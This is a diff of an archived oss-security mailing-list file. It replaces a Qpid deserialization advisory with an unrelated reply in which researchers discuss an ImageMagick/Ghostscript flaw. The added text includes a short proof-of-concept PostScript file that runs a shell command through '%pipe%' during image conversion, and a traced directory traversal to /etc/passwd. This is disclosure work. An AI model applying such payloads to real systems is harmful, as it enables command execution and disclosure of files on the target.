@@ -1,39 +1,39 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/02/1
-Message-ID: <CAFitrpQuqhcLM2ZV9PKfqieHRD+uz+h4Ljd5DSbhiq-Dhvf8LA@mail.gmail.com>
-Date: Sat, 2 Jul 2016 02:15:24 +0100
-From: Robbie Gemmell <robbie@...che.org>
-To: "dev@...d.apache.org" <dev@...d.apache.org>, "users@...d.apache.org" <users@...d.apache.org>, announce@...che.org,  "security@...che.org" <security@...che.org>, oss-security@...ts.openwall.com,  bugtraq@...urityfocus.com
-Subject: [SECURITY] CVE-2016-4974: Apache Qpid: deserialization of untrusted input while using JMS ObjectMessage
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/10
+Message-ID: <CAJ_zFkJnFQuTGgRzkPhAV1x+eBnh3r7sXSs=9OMNNVMDUDorRg@mail.gmail.com>
+Date: Fri, 30 Sep 2016 15:58:25 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: Florian Weimer <fw@...eb.enyo.de>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
-[CVE-2016-4974] Apache Qpid: deserialization of untrusted input while
-using JMS ObjectMessage
+On Fri, Sep 30, 2016 at 2:11 PM, Florian Weimer <fw@...eb.enyo.de> wrote:
+> * Tavis Ormandy:
+>>
+>> $ cat test.gif
+>> currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
+>> .putdeviceparams
+>> quit
+>> $ convert test.gif png:test.png
+>>
+>> (Note: I don't know why it doesn't work on earlier versions, maybe
+>> it's possible to make it work, or some other param will work)
+>
+> It still tries to open a file in earlier versions, with directory
+> traversal:
+>
+> [pid 29607] open("/usr/share/ghostscript/9.06/iccprofiles/../../../../../etc/passwd", O_RDONLY) = 5
+>
+> The %pipe%-based execution was introduced as a side effect of:
+>
 
-Severity: Moderate
+Thanks Florian! I took a look where that directory comes from, I think
+it pulls it from a userparam, like:
 
-Vendor: The Apache Software Foundation
+<< (ICCProfilesDir) (whatever) >> .setuserparams
 
-Versions Affected:
-Qpid AMQP 0-x JMS client 6.0.3 and earlier
-Qpid JMS (AMQP 1.0) client 0.9.0 and earlier
+That probably needs to be fixed. I wonder if there's a way to get that
+directory to populate back into the PermitFileReading array?
 
-Description:
-When applications call getObject() on a consumed JMS ObjectMessage they are
-subject to the behaviour of any object deserialization during the process
-of constructing the body to return. Unless the application has taken outside
-steps to limit the deserialization process, they can't protect against
-input that might try to make undesired use of classes available on the
-application classpath that might be vulnerable to exploitation.
-
-Mitigation:
-Users using ObjectMessage can upgrade to Qpid AMQP 0-x JMS client
-6.0.4 or Qpid JMS (AMQP 1.0) client 0.10.0 or later, and use the new
-configuration options to whitelist trusted content permitted for
-deserialization. When so configured, attempts to deserialize input
-containing other content will be prevented. Alternatively, users of older
-client releases may utilise other means such as agent-based approach to help
-govern content permitted for deserialization in their application.
-
-Credit:
-This issue was discovered by Matthias Kaiser of Code White (www.code-white.com)
+Tavis.
